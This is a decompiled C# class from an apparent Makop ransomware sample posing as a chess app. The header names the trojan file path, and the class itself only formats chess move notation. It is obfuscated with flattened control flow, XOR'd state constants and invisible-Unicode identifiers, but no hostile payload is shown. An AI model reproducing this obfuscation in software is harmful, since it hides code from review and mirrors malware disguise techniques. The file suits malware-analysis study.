// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Notation
// Assembly: Yx, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 400FF0AC-C9F5-4D3D-92AD-97AFF85F6668
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-3ae1c8125ddc0d024ac1f14b9ba78e44f10bfc281ca7e9c68cec7db8af6ee9b3.exe

using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class Notation
  {
    public Square from;
    public Square to;

    public string Move
    {
      get
      {
label_1:
        int num1 = 276451981;
        string move;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 502910060)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              move = Notation.\u206C‭‪⁬⁯​‍‫‭‫‪⁯‏‏‮‪⁫‪​‫‍⁭‏‪⁮‬‮‪‭‍‭‫‮‬‌⁫‍‍⁫⁫‮(this.from.CurrentSquare, \u003CModule\u003E.\u206E‭‏‍​‏⁪⁯⁪‭⁮⁭⁪‬⁫‏​⁪⁯⁪⁫​⁬⁯‫‍‭⁭‪​‪⁫‎⁫⁬‮⁮⁮​‌‮<string>(2591337035U), this.to.CurrentSquare);
              num1 = (int) num2 * -1843027585 ^ -1402355622;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return move;
      }
    }

    public Notation(Square f, Square t, Board bo)
    {
label_1:
      int num1 = -1226882077;
      Square square1;
      Square square2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -775019125)) % 7U)
        {
          case 0:
            goto label_1;
          case 2:
            square1 = new Square(f.File, f.Rank, bo);
            num1 = (int) num2 * 1763059344 ^ -1008442520;
            continue;
          case 3:
            square2 = new Square(t.File, t.Rank, bo);
            num1 = (int) num2 * 1399812754 ^ -1736868722;
            continue;
          case 4:
            square2.Piece = new ChessPiece(t, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * -249188953 ^ -468252228;
            continue;
          case 5:
            num1 = (int) num2 * 59913513 ^ 1912319301;
            continue;
          case 6:
            square1.Piece = new ChessPiece(f, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * 460880970 ^ -774064833;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      this.from = square1;
      this.to = square2;
    }

    public override string ToString()
    {
label_1:
      int num1 = -625432260;
      string move;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -817984667)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            move = this.Move;
            num1 = (int) num2 * -1296189674 ^ 525233906;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return move;
    }

    static string \u206C‭‪⁬⁯​‍‫‭‫‪⁯‏‏‮‪⁫‪​‫‍⁭‏‪⁮‬‮‪‭‍‭‫‮‬‌⁫‍‍⁫⁫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
